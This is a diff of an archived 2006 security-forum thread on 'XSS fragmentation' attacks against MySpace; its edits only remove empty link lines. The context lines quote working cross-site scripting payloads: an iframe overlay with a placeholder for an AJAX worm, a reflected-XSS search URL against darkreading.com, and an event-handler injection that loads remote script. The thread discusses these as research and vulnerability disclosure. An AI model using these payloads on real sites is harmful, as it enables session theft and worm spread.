@@ -207,7 +207,7 @@ Sadly/Luckily (depending on your viewpoint) manyfilters such as the ones employe
 
  Edited 1 time(s). Last edit at 10/22/2006 02:44AM by kuza55.
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -219,7 +219,7 @@ Excellent article. I never thought about this as an attack vector before!
 
  - [Kyran](http://kyran.wordpress.com)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -232,7 +232,7 @@ Good stuff.
  Don't forget our IRC: irc://irc.irchighway.net/#slackers
  -[WhiteAcid](http://www.whiteacid.org) - your friendly, very lazy, web developer
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -244,7 +244,7 @@ indeed, a very interesting attack scenario.. good job ^^
 
  -maluc
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -257,7 +257,7 @@ Very clever. I've seen this a few times in the wild. It's nice to see a good wri
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -269,7 +269,7 @@ Yeah it was definetely clever. A good example of why one should not use contextu
 
  - [Kyran](http://kyran.wordpress.com)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -279,7 +279,7 @@ Date: October 22, 2006 02:14PM
 
 I tried something similar some time ago, but didn't get a working real-world example yet. Thanks, kuza55!
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -295,7 +295,7 @@ Wow.. nice find.
 
  Edited 1 time(s). Last edit at 10/22/2006 08:56PM by Disciple.
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -318,7 +318,7 @@ Here's a way to use a script with filtered functions and make it unnoticable:
 
  <script>//ajax worm goes here!</script><iframe src="http://myspace.com/yourprofile?xss" style="width:100%;height:100%;position:absolute;top:0;left:0;border:0;z-index:100;"></iframe>
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -331,7 +331,7 @@ Nicely done. Yet another reason not to use Myspace. Ugh!
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -344,7 +344,7 @@ You were looking for reasons to not use it?
  Don't forget our IRC: irc://irc.irchighway.net/#slackers
  -[WhiteAcid](http://www.whiteacid.org) - your friendly, very lazy, web developer
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -357,7 +357,7 @@ No, but I happen to collect reasons why data mining companies shouldn't be trust
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -372,7 +372,7 @@ It still works:
 
  One day there will be something here... http://int2e.com
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -385,7 +385,7 @@ Article on the topic: http://www.darkreading.com/document.asp?doc_id=108161&f_sr
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -399,7 +399,7 @@ Hmmm. Ironically, Darkreading is kinda vulnerable to the same thing...
 
  http://www.darkreading.com/search.asp?search_type=content&search_request=yes&search_value=%3Ciframe+src%3Dhttp%3A%2F%2Fsla.ckers.org+&start_date=&end_date=§ion_type=></iframe>News+Analysis&taxonomy=livedefault&topics=livedefault&doc_author=livedefault&action=Search
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -412,7 +412,7 @@ Nice find! And to make it a little better/run JS: http://www.darkreading.com/sea
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -424,7 +424,7 @@ Wow. I think darkreading lurks here...
 
  It now filters out iframe :)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -440,7 +440,7 @@ to the darkreading admin who reads this.. you do a good job a addressing holes q
 
  -maluc
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -452,7 +452,7 @@ Span, object, div are also still available. Wierdly, the admin does filter the '
 
  And I agree - excellent speed on the fix!
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -463,7 +463,7 @@ Date: October 27, 2006 06:54PM
 Well, even though MySpace implemented a 'fix' to this issue, its still very much epxloitable, I've posted details here:
  [[kuza55.blogspot.com](http://kuza55.blogspot.com/2006/10/myspace-xss-fragmentation-again.html)]
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -476,7 +476,7 @@ It would be really helpful to see a PoC... let me know if you can create one, I'
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -500,7 +500,7 @@ My observations of the changes made are that they simply check to see if there i
 Not knowing the internals of the filter my best guess as to what the programatic changes were would be that they use a regex to filter out event handlers (so anything of the form on*=) if its inside a tag. They now seem to use the same regex if a single quote is found in an input field.
 ```
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -513,7 +513,7 @@ So it only works in IE? Not that that's a big deal, really, given the penetratio
  - RSnake
  Gotta love it. [http://ha.ckers.org](http://ha.ckers.org/)
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -537,7 +537,7 @@ x.src='http://ha.ckers.org/s.js';document.appendChild(x)">
 
  -maluc
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -549,7 +549,7 @@ Yep, it only works in IE, and AFAIK only in IE 6 at that, but like you said cons
 
  Even an exploit that only worked on Firefox would still be something you'd want to fix on your site, because 10% is still quite a large number of people......
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -582,7 +582,7 @@ asdf' asdflkeiw 'blah' weoe "banana" >
 
 ```
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -594,7 +594,7 @@ it works in IE7 as well
 
  -maluc
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -610,7 +610,7 @@ and lol, with that realization .. style='blah' works fine.
 
  -maluc
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
@@ -622,7 +622,7 @@ Ah, I thought that grave accents had been deprecated in IE7, thanks for clarifyi
 
  Mmm, I went through all the CSS attack vectors on the cheatsheet and the only one which they allowed through was behavior: which needs a locally hosted .htc file, and it has to be a .htc file, you can't use an image file or similar, so I'm not really anticipating anything further using XSS Fragmentation, even if they just do a dodgy fix where they filter out event handlers if you have a grave accent in an input field....
 
- []()
+ 
 
 **Re: XSS Fragmentation Attacks + MySpace 0day**
 
